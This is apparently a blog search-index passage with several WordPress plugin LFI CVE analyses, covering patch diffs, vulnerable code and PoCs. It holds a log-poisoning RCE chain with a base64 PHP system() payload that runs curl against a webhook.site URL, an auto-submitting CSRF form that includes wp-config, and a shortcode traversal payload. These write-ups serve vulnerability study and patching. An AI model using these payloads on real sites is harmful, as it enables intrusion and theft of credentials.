'https://webhook.site/bac7e163-b475-4323-a315-acd010359640' Finally, system() runs this command and returns its output. Warning Note: although base64_decode may be blocked by the plugin, Apache logged the payload before the plugin processed it; the Base64 string was still recorded in the log. ","date":"2025-10-18","objectID":"/posts/2025-10-18-cve-2025-26909/:4:2","tags":["analyst","plugin","lfi"],"title":"CVE-2025-26909 Analysis \u0026 POC","uri":"/posts/2025-10-18-cve-2025-26909/#log-poisoning--lfi--rce"},{"categories":["CVE Analysis"],"collections":null,"content":"Log poisoning → LFI → RCE\rStep 1\rSend a request with PHP code placed in the User-Agent header GET / HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Ubuntu;\u003c?php system(base64_decode('Y3VybCAtSSAnaHR0cHM6Ly93ZWJob29rLnNpdGUvYmFjN2UxNjMtYjQ3NS00MzIzLWEzMTUtYWNkMDEwMzU5NjQwJw==')); ?\u003e Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Connection: keep-alive Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 X-PwnFox-Color: blue Priority: u=0, i Content-Length: 0 Step 2\rSend a request with the LFI payload pointing to /var/log/apache2/other_vhosts_access.log GET /x/wp-activate.php/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/var/log/apache2/other_vhosts_access.log? HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Connection: keep-alive Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 X-PwnFox-Color: blue Priority: u=0, i Content-Length: 0 Result: Successful LFI =\u003e RCE result Explanation: \u003c?php system(base64_decode('Y3VybCAtSSAnaHR0cHM6Ly93ZWJob29rLnNpdGUvYmFjN2UxNjMtYjQ3NS00MzIzLWEzMTUtYWNkMDEwMzU5NjQwJw==')); ?\u003e When visiting the site with a User‑Agent containing the payload above, Apache will log this payload into the access log: w41bu1@22NS088:~$ cat /var/log/apache2/other_vhosts_access.log 127.0.1.1:80 127.0.0.1 - - [18/Oct/2025:19:10:08 +0700] \"GET /x/wp-activate.php/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/var/log/apache2/other_vhosts_access.log? HTTP/1.1\" 403 2844 \"-\" \"Mozilla/5.0 (X11; Ubuntu; \u003c?php system(base64_decode('Y3VybCAtSSAnaHR0cHM6Ly93ZWJob29rLnNpdGUvYmFjN2UxNjMtYjQ3NS00MzIzLWEzMTUtYWNkMDEwMzU5NjQwJw==')); ?\u003eLinux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0\" When include() loads a file, PHP will execute any PHP code (\u003c?php ?\u003e) contained in the file before returning. The payload is Base64-encoded and decoded at include time with base64_decode to avoid escaping issues with quotes (\" → \\\") when the logger writes it. The decoded command becomes: curl -I 'https://webhook.site/bac7e163-b475-4323-a315-acd010359640' Finally, system() runs this command and returns its output. Warning Note: although base64_decode may be blocked by the plugin, Apache logged the payload before the plugin processed it; the Base64 string was still recorded in the log. ","date":"2025-10-18","objectID":"/posts/2025-10-18-cve-2025-26909/:4:2","tags":["analyst","plugin","lfi"],"title":"CVE-2025-26909 Analysis \u0026 POC","uri":"/posts/2025-10-18-cve-2025-26909/#step-1"},{"categories":["CVE Analysis"],"collections":null,"content":"Log poisoning → LFI → RCE\rStep 1\rSend a request with PHP code placed in the User-Agent header GET / HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Ubuntu;\u003c?php system(base64_decode('Y3VybCAtSSAnaHR0cHM6Ly93ZWJob29rLnNpdGUvYmFjN2UxNjMtYjQ3NS00MzIzLWEzMTUtYWNkMDEwMzU5NjQwJw==')); ?\u003e Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Connection: keep-alive Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 X-PwnFox-Color: blue Priority: u=0, i Content-Length: 0 Step 2\rSend a request with the LFI payload pointing to /var/log/apache2/other_vhosts_access.log GET /x/wp-activate.php/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/var/log/apache2/other_vhosts_access.log? HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Connection: keep-alive Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 X-PwnFox-Color: blue Priority: u=0, i Content-Length: 0 Result: Successful LFI =\u003e RCE result Explanation: \u003c?php system(base64_decode('Y3VybCAtSSAnaHR0cHM6Ly93ZWJob29rLnNpdGUvYmFjN2UxNjMtYjQ3NS00MzIzLWEzMTUtYWNkMDEwMzU5NjQwJw==')); ?\u003e When visiting the site with a User‑Agent containing the payload above, Apache will log this payload into the access log: w41bu1@22NS088:~$ cat /var/log/apache2/other_vhosts_access.log 127.0.1.1:80 127.0.0.1 - - [18/Oct/2025:19:10:08 +0700] \"GET /x/wp-activate.php/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/var/log/apache2/other_vhosts_access.log? HTTP/1.1\" 403 2844 \"-\" \"Mozilla/5.0 (X11; Ubuntu; \u003c?php system(base64_decode('Y3VybCAtSSAnaHR0cHM6Ly93ZWJob29rLnNpdGUvYmFjN2UxNjMtYjQ3NS00MzIzLWEzMTUtYWNkMDEwMzU5NjQwJw==')); ?\u003eLinux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0\" When include() loads a file, PHP will execute any PHP code (\u003c?php ?\u003e) contained in the file before returning. The payload is Base64-encoded and decoded at include time with base64_decode to avoid escaping issues with quotes (\" → \\\") when the logger writes it. The decoded command becomes: curl -I 'https://webhook.site/bac7e163-b475-4323-a315-acd010359640' Finally, system() runs this command and returns its output. Warning Note: although base64_decode may be blocked by the plugin, Apache logged the payload before the plugin processed it; the Base64 string was still recorded in the log. ","date":"2025-10-18","objectID":"/posts/2025-10-18-cve-2025-26909/:4:2","tags":["analyst","plugin","lfi"],"title":"CVE-2025-26909 Analysis \u0026 POC","uri":"/posts/2025-10-18-cve-2025-26909/#step-2"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rHide My WP Ghost version ≤ 5.4.01 allows LFI because the plugin reconstructs a path and then include()s it without canonicalization/whitelisting. By combining log‑poisoning and a payload containing /wp-activate.php/?, an attacker can escalate LFI to RCE in some configurations. The issue is fixed in 5.4.02 by sanitizing the URL before returning. ","date":"2025-10-18","objectID":"/posts/2025-10-18-cve-2025-26909/:4:3","tags":["analyst","plugin","lfi"],"title":"CVE-2025-26909 Analysis \u0026 POC","uri":"/posts/2025-10-18-cve-2025-26909/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key takeaways\rDo not directly include data from requests. Use realpath() / basename() / whitelist / base_dir checks before including. sanitize_text_field() is not sufficient to prevent traversal. Log poisoning (User‑Agent, Referer…) can create an inclusionable payload source — do not log raw content that might later be included. Fixes must combine: sanitize + canonicalize + directory restriction + control over log write permissions. ","date":"2025-10-18","objectID":"/posts/2025-10-18-cve-2025-26909/:4:4","tags":["analyst","plugin","lfi"],"title":"CVE-2025-26909 Analysis \u0026 POC","uri":"/posts/2025-10-18-cve-2025-26909/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rFile Inclusion/Path traversal — Hacktrick WordPress Hide My WP Ghost Plugin \u003c= 5.4.01 is vulnerable to Local File Inclusion ","date":"2025-10-18","objectID":"/posts/2025-10-18-cve-2025-26909/:5:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-26909 Analysis \u0026 POC","uri":"/posts/2025-10-18-cve-2025-26909/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress License For Envato Plugin.","date":"2025-10-17","objectID":"/posts/2025-10-17-cve-2025-39399/","tags":["analyst","plugin","lfi"],"title":"CVE-2025-39399 Analysis \u0026 POC","uri":"/posts/2025-10-17-cve-2025-39399/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rThe License For Envato plugin version ≤ 1.0.0 contains a Local File Inclusion vulnerability that allows an attacker to control the file parameter used in include/require without authentication, thereby including or reading local files on the server (e.g., configuration files containing credentials), leading to sensitive information disclosure and, in some configurations, potential code execution. CVE ID: CVE-2025-39399 Vulnerability Type: Local File Inclusion Affected Versions: \u003c= 1.0.0 Patched Versions: 1.1.0 CVSS severity: High (7.5) Required Privilege: Unauthenticated Product: WordPress License For Envato Plugin ","date":"2025-10-17","objectID":"/posts/2025-10-17-cve-2025-39399/:1:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-39399 Analysis \u0026 POC","uri":"/posts/2025-10-17-cve-2025-39399/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - License For Envato: 1.0.0 (vulnerable) and 1.1.0 (patched). Diff tool - Meld or any diff/compare tool to inspect differences between the two versions. ","date":"2025-10-17","objectID":"/posts/2025-10-17-cve-2025-39399/:2:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-39399 Analysis \u0026 POC","uri":"/posts/2025-10-17-cve-2025-39399/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\r","date":"2025-10-17","objectID":"/posts/2025-10-17-cve-2025-39399/:3:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-39399 Analysis \u0026 POC","uri":"/posts/2025-10-17-cve-2025-39399/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff\rVulnerable version: \u003cdiv class=\"wrap\"\u003e \u003c?php $action = isset( $_GET['tab'] ) ? sanitize_text_field( $_GET['tab'] ) : 'general'; ?\u003e // other logic \u003c?php $dir = __DIR__; $licenseEnvato_nav_view = apply_filters( 'license_envato_settings_view', $dir, $action ); if ($licenseEnvato_nav_view) { $template = \"{$licenseEnvato_nav_view}/{$action}.php\"; } if ( file_exists( $template ) ) { include $template; }else{ include \"{$licenseEnvato_nav_view}/general.php\"; } ?\u003e \u003c/div\u003e In the vulnerable version, the value of $action is taken directly from $_GET['tab']. Although this value is passed through sanitize_text_field(), that function only strips HTML tags — it does not prevent path traversal sequences like ../. Therefore, an attacker can supply a value such as ?tab=../../somefile, causing $action to contain an unexpected path. When this value is concatenated into $template and then included =\u003e LFI occurs. Patched version: \u003c?php // Exit if accessed directly defined('ABSPATH') || exit; // Define allowed tab values to prevent LFI $allowed_tabs = array('general', 'envato'); // Apply filter to allow extensions to add their own tabs $allowed_tabs = apply_filters('license_envato_allowed_tabs', $allowed_tabs); // Verify nonce if tab parameter is set $action = 'general'; if (isset($_GET['tab'])) { // Verify nonce for tab switching if provided if (isset($_GET['_wpnonce']) \u0026\u0026 wp_verify_nonce(sanitize_text_field(wp_unslash($_GET['_wpnonce'])), 'license_envato_switch_tab')) { $tab = sanitize_text_field(wp_unslash($_GET['tab'])); // Only allow values from the whitelist $action = in_array($tab, $allowed_tabs) ? $tab : 'general'; } elseif (!isset($_GET['_wpnonce'])) { // If no nonce is provided, still allow tab switching but sanitize input $tab = sanitize_text_field(wp_unslash($_GET['tab'])); // Only allow values from the whitelist $action = in_array($tab, $allowed_tabs) ? $tab : 'general'; } } ?\u003e \u003cdiv class=\"wrap\"\u003e \u003c?php $dir = __DIR__; $licenseEnvato_nav_view = apply_filters( 'license_envato_settings_view', $dir, $action ); if ($licenseEnvato_nav_view) { // Ensure we only include files within the plugin directory structure $template = realpath(\"{$licenseEnvato_nav_view}/{$action}.php\"); $nav_view_dir = realpath($licenseEnvato_nav_view); // Verify the template is a child of the nav view directory to prevent path traversal if ($template \u0026\u0026 $nav_view_dir \u0026\u0026 strpos($template, $nav_view_dir) === 0 \u0026\u0026 file_exists($template)) { include $template; } else { // Fallback to general.php with the same security checks $general_template = realpath(\"{$licenseEnvato_nav_view}/general.php\"); if ($general_template \u0026\u0026 strpos($general_template, $nav_view_dir) === 0) { include $general_template; } } } ?\u003e \u003c/div\u003e The patch implements multiple measures to mitigate LFI and harden the handling of the tab parameter: Use a whitelist $allowed_tabs $allowed_tabs = array('general', 'envato'); $allowed_tabs = apply_filters('license_envato_allowed_tabs', $allowed_tabs); Verify nonce to prevent CSRF if (isset($_GET['_wpnonce']) \u0026\u0026 wp_verify_nonce(..., 'license_envato_switch_tab')) The reason the CVE is labeled Unauthenticated is that an attacker does not need an account on the target site to exploit it. A common technique is to trick an admin (or a privileged user) into visiting a page containing the payload. When the admin opens that page, the browser sends a request to the WordPress site including the admin session cookie — so the request is considered authenticated as the admin. If the plugin accepts and executes the parameter without nonce or permission checks, the LFI payload will be processed and exploited. Normalize and validate paths using realpath() $template = realpath(\"{$licenseEnvato_nav_view}/{$action}.php\"); $nav_view_dir = realpath($licenseEnvato_nav_view); ","date":"2025-10-17","objectID":"/posts/2025-10-17-cve-2025-39399/:3:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-39399 Analysis \u0026 POC","uri":"/posts/2025-10-17-cve-2025-39399/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code\rpublic function plugin_page() { $license_envato_api = new EnvatoLicenseApiCall(); $settingsView = __DIR__ . '/views/settingsView.php'; if ( file_exists( $settingsView ) ) { include $settingsView; } } settingsView.php is always present in the source, so it is definitely included in plugin_page(). public function admin_menu() { $parent_slug = 'licenseenvato'; $capability = 'manage_options'; add_submenu_page( $parent_slug, __( 'Settings', 'licenseenvato' ), __( 'Settings', 'licenseenvato' ), $capability, $parent_slug.'-settings', [ $this, 'settings' ] ); } public function settings() { $settings = new Settings(); $settings-\u003eplugin_page(); } plugin_page() is called via the “Settings” submenu callback, registered in admin_menu(). This submenu requires the manage_options capability, so it is shown only to admins. When an admin opens the “Settings” submenu (endpoint licenseenvato-settings), WordPress calls settings(), which instantiates the Settings class and runs plugin_page(). ","date":"2025-10-17","objectID":"/posts/2025-10-17-cve-2025-39399/:3:2","tags":["analyst","plugin","lfi"],"title":"CVE-2025-39399 Analysis \u0026 POC","uri":"/posts/2025-10-17-cve-2025-39399/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-10-17","objectID":"/posts/2025-10-17-cve-2025-39399/:4:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-39399 Analysis \u0026 POC","uri":"/posts/2025-10-17-cve-2025-39399/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rStep 1\rCreate a page that contains the LFI payload \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"\u003e \u003ctitle\u003ew41bu1\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cform action=\"http://localhost/wp-admin/admin.php\" method=\"get\"\u003e \u003cinput type=\"text\" name=\"page\" value=\"licenseenvato-settings\"\u003e \u003cinput type=\"text\" name=\"tab\" value=\"../../../../../../wp-config\"\u003e \u003c/form\u003e \u003cscript\u003e document.forms[0].submit() \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e Step 2\rSend the link to the admin Result: The debugger jumped to wp-config.php Successful LFI result ","date":"2025-10-17","objectID":"/posts/2025-10-17-cve-2025-39399/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-39399 Analysis \u0026 POC","uri":"/posts/2025-10-17-cve-2025-39399/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rStep 1\rCreate a page that contains the LFI payload \u003c!DOCTYPE html\u003e w41bu1 Step 2\rSend the link to the admin Result: The debugger jumped to wp-config.php Successful LFI result ","date":"2025-10-17","objectID":"/posts/2025-10-17-cve-2025-39399/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-39399 Analysis \u0026 POC","uri":"/posts/2025-10-17-cve-2025-39399/#step-1"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rStep 1\rCreate a page that contains the LFI payload \u003c!DOCTYPE html\u003e w41bu1 Step 2\rSend the link to the admin Result: The debugger jumped to wp-config.php Successful LFI result ","date":"2025-10-17","objectID":"/posts/2025-10-17-cve-2025-39399/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-39399 Analysis \u0026 POC","uri":"/posts/2025-10-17-cve-2025-39399/#step-2"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rVersion ≤ 1.0.0 of License For Envato allows LFI because include() uses $atts['template'] without proper validation; the vulnerability was fixed in 1.1.0 using basename() + realpath() and base_dir checks. ","date":"2025-10-17","objectID":"/posts/2025-10-17-cve-2025-39399/:5:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-39399 Analysis \u0026 POC","uri":"/posts/2025-10-17-cve-2025-39399/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key takeaways\rUsing only sanitize_text_field() is not sufficient to prevent path traversal in PHP. Any parameter used in include() or file operations must be controlled by a whitelist or validated via realpath(). CSRF combined with LFI can turn an admin-only flaw into an unauthenticated vulnerability if nonce verification is missing. Inputs must be strictly validated and the scope of accessible files restricted, especially in plugins that handle templates or views. Always validate and constrain paths when including files — never trust request data even if it has been “sanitized”. ","date":"2025-10-17","objectID":"/posts/2025-10-17-cve-2025-39399/:6:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-39399 Analysis \u0026 POC","uri":"/posts/2025-10-17-cve-2025-39399/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rFile Inclusion/Path traversal — Hacktrick WordPress License For Envato Plugin \u003c= 1.0.0 is vulnerable to Local File Inclusion ","date":"2025-10-17","objectID":"/posts/2025-10-17-cve-2025-39399/:7:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-39399 Analysis \u0026 POC","uri":"/posts/2025-10-17-cve-2025-39399/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Subscribe to Download Lite Plugin.","date":"2025-10-16","objectID":"/posts/2025-10-16-cve-2025-30782/","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30782 Analysis \u0026 POC","uri":"/posts/2025-10-16-cve-2025-30782/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rThe Subscribe to Download Lite plugin version ≤ 1.2.9 contains a Local File Inclusion vulnerability that allows an unauthenticated attacker to control the file parameter used in include/require, thereby including or reading local files on the server (for example configuration files that contain credentials), leading to sensitive information disclosure and, in some configurations, possible code execution. CVE ID: CVE-2025-30782 Vulnerability Type: Local File Inclusion Affected Versions: \u003c= 1.2.9 Patched Versions: 1.3.0 CVSS severity: Low (7.5) Required Privilege: Contributor Product: WordPress Subscribe to Download Lite Plugin ","date":"2025-10-16","objectID":"/posts/2025-10-16-cve-2025-30782/:1:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30782 Analysis \u0026 POC","uri":"/posts/2025-10-16-cve-2025-30782/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Subscribe to Download Lite: 1.2.9 (vulnerable) and 1.3.0 (patched). Diff tool - Meld or any diff tool to inspect and compare differences between the two versions. ","date":"2025-10-16","objectID":"/posts/2025-10-16-cve-2025-30782/:2:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30782 Analysis \u0026 POC","uri":"/posts/2025-10-16-cve-2025-30782/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\r","date":"2025-10-16","objectID":"/posts/2025-10-16-cve-2025-30782/:3:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30782 Analysis \u0026 POC","uri":"/posts/2025-10-16-cve-2025-30782/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff\rVulnerable version: \u003cdiv class=\"stdl-form-wrap stdl-\u003c?php echo esc_attr($form_template); ?\u003e stdl-alias\u003e\"\u003e \u003cform method=\"post\" action=\"\" class=\"stdl-subscription-form\" data-form-alias=\"stdl\"\u003e \u003c?php do_action('stdl_before_form', $form_details); if (file_exists(STDL_PATH . 'inc/views/frontend/form-templates/' . $form_template . '.php')) { include(STDL_PATH . 'inc/views/frontend/form-templates/' . $form_template . '.php'); } do_action('stdl_after_form', $form_details); ?\u003e \u003c/form\u003e \u003c/div\u003e In the vulnerable version, $form_template is concatenated into the path and included without validating the input =\u003e LFI risk, for example: $form_template = '../../../../../../../wp-config' Patched version: \u003cdiv class=\"stdl-form-wrap stdl-\u003c?php echo esc_attr($form_template); ?\u003e stdl-alias\u003e\"\u003e \u003cform method=\"post\" action=\"\" class=\"stdl-subscription-form\" data-form-alias=\"stdl\"\u003e \u003c?php do_action('stdl_before_form', $form_details); $base_dir = realpath(STDL_PATH . 'inc/views/frontend/form-templates') . DIRECTORY_SEPARATOR; $sanitized_template = basename($form_template) . '.php'; $file_path = realpath($base_dir . $sanitized_template); if ($file_path \u0026\u0026 strpos($file_path, $base_dir) === 0 \u0026\u0026 file_exists($file_path)) { include($file_path); } do_action('stdl_after_form', $form_details); ?\u003e \u003c/form\u003e \u003c/div\u003e The patch uses basename() to extract the file name portion of $form_template, removing traversal sequences ../, for example: ../../../../../../payload.pdf -\u003e payload.pdf Then it concatenates into $base_dir and resolves the absolute path with realpath before include() =\u003e effectively eliminates the LFI possibility. ","date":"2025-10-16","objectID":"/posts/2025-10-16-cve-2025-30782/:3:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30782 Analysis \u0026 POC","uri":"/posts/2025-10-16-cve-2025-30782/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code\rThe vulnerable form-template.php shown above is invoked from stdl-shortcode.php \u003c?php $form_template = (!empty($atts['template'])) ? $atts['template'] : $form_details['layout']['template']; if (isset($_COOKIE['stdl_encryption_key']) \u0026\u0026 $this-\u003echeck_if_already_subscribed($_COOKIE['stdl_encryption_key']) \u0026\u0026 empty($form_details['general']['always_show'])) { // other logic } else { // other logic if ($display_type == 'direct') { include(STDL_PATH . 'inc/views/frontend/form-template.php'); } else { ?\u003e \u003cdiv class=\"stdl-popup-outerwrap \u003c?php echo esc_attr($popup_alias_class); ?\u003e\"\u003e \u003cinput type=\"button\" class=\"stdl-popup-trigger stdl-popup-\u003c?php echo esc_attr($form_template); ?\u003e\" value=\"\u003c?php echo esc_attr($popup_trigger_text); ?\u003e\"\u003e \u003cdiv class=\"stdl-popup-innerwrap\" style=\"display:none;\"\u003e \u003cdiv class=\"stdl-overlay stdl-popup-wrapper\"\u003e \u003cdiv class=\"stdl-popup-contetn-wrap\"\u003e \u003ca href=\"javascript:void(0)\" class=\"stdl-popup-close\"\u003e\u003ci class=\"fas fa-times\"\u003e\u003c/i\u003e\u003c/a\u003e \u003c?php include(STDL_PATH . 'inc/views/frontend/form-template.php'); ?\u003e \u003c/div\u003e \u003c/div\u003e \u003c/div\u003e \u003c/div\u003e \u003c?php } } $form_template is the value of $atts['template'] From CVE analysis experience on WordPress plugins, $atts is typically the shortcode attributes array, for example: [pornhub id=69] Note that form-template.php is always included within the inner if-else block inside the outer else when the stdl_encryption_key cookie does not exist (i.e., the user has not subscribed or does not have a valid encryption key). stdl-shortcode.php is included by the shortcode callback subscribe_to_download_form with atts being the shortcode attributes array. function __construct() { add_shortcode('subscribe_to_download_form', array($this, 'generate_shortcode_output')); } function generate_shortcode_output($atts) { wp_enqueue_style('stdl-frontend-custom', STDL_CSS_DIR . '/stdl-custom.css', array(), STDL_VERSION); ob_start(); include(STDL_PATH . 'inc/views/frontend/stdl-shortcode.php'); $form_html = ob_get_contents(); ob_clean(); return $form_html; } ","date":"2025-10-16","objectID":"/posts/2025-10-16-cve-2025-30782/:3:2","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30782 Analysis \u0026 POC","uri":"/posts/2025-10-16-cve-2025-30782/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-10-16","objectID":"/posts/2025-10-16-cve-2025-30782/:4:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30782 Analysis \u0026 POC","uri":"/posts/2025-10-16-cve-2025-30782/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rStep 1\rLog in to WordPress with a Contributor account (lowest privilege that can create posts). Step 2\rCreate a post with the shortcode [subscribe_to_download_form template='../../../../../../../wp-config'] Result: The debugger reached wp-config.php Successful LFI result ","date":"2025-10-16","objectID":"/posts/2025-10-16-cve-2025-30782/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30782 Analysis \u0026 POC","uri":"/posts/2025-10-16-cve-2025-30782/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rStep 1\rLog in to WordPress with a Contributor account (lowest privilege that can create posts). Step 2\rCreate a post with the shortcode [subscribe_to_download_form template='../../../../../../../wp-config'] Result: The debugger reached wp-config.php Successful LFI result ","date":"2025-10-16","objectID":"/posts/2025-10-16-cve-2025-30782/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30782 Analysis \u0026 POC","uri":"/posts/2025-10-16-cve-2025-30782/#step-1"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rStep 1\rLog in to WordPress with a Contributor account (lowest privilege that can create posts). Step 2\rCreate a post with the shortcode [subscribe_to_download_form template='../../../../../../../wp-config'] Result: The debugger reached wp-config.php Successful LFI result ","date":"2025-10-16","objectID":"/posts/2025-10-16-cve-2025-30782/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30782 Analysis \u0026 POC","uri":"/posts/2025-10-16-cve-2025-30782/#step-2"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rVersion ≤ 1.2.9 of Subscribe to Download Lite allows LFI because include() uses an unvalidated $atts['template']; the issue was fixed in 1.3.0 by normalizing and restricting the template name (basename() + realpath() + base_dir check) before include(). Update immediately. ","date":"2025-10-16","objectID":"/posts/2025-10-16-cve-2025-30782/:5:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30782 Analysis \u0026 POC","uri":"/posts/2025-10-16-cve-2025-30782/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key takeaways\rShortcode input is untrusted — do not include directly. Patch (v1.3.0) uses basename() + realpath() + compare with allowed directory. Actions: update the plugin, whitelist/validate attributes. Monitor logs for ../ in template parameters. ","date":"2025-10-16","objectID":"/posts/2025-10-16-cve-2025-30782/:6:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30782 Analysis \u0026 POC","uri":"/posts/2025-10-16-cve-2025-30782/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rFile Inclusion/Path traversal — Hacktrick WordPress Subscribe to Download Lite Plugin \u003c= 1.2.9 is vulnerable to Local File Inclusion ","date":"2025-10-16","objectID":"/posts/2025-10-16-cve-2025-30782/:7:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30782 Analysis \u0026 POC","uri":"/posts/2025-10-16-cve-2025-30782/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Team Manager Plugin.","date":"2025-10-15","objectID":"/posts/2025-10-15-cve-2025-30868/","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30868 Analysis \u0026 POC","uri":"/posts/2025-10-15-cve-2025-30868/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rThe Team Manager plugin version ≤ 2.1.23 contains a Local File Inclusion vulnerability that allows an unauthenticated attacker to control the file parameter used in include/require, enabling inclusion or reading of local files on the server (e.g., configuration files containing credentials), leading to leakage of sensitive information and, in some server configurations, possible code execution. CVE ID: CVE-2025-30868 Vulnerability Type: Local File Inclusion Affected Versions: \u003c= 2.1.23 Patched Versions: 2.2.0 CVSS severity: Low (7.5) Required Privilege: Contributor Product: WordPress Team Manager Plugin ","date":"2025-10-15","objectID":"/posts/2025-10-15-cve-2025-30868/:1:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30868 Analysis \u0026 POC","uri":"/posts/2025-10-15-cve-2025-30868/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Team Manager: 2.1.23 (vulnerable) and 2.2.0 (patched). Diff tool - Meld or any diff tool to compare differences between versions. Elementor plugin ","date":"2025-10-15","objectID":"/posts/2025-10-15-cve-2025-30868/:2:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30868 Analysis \u0026 POC","uri":"/posts/2025-10-15-cve-2025-30868/#requirements"},{"categories":["CVE 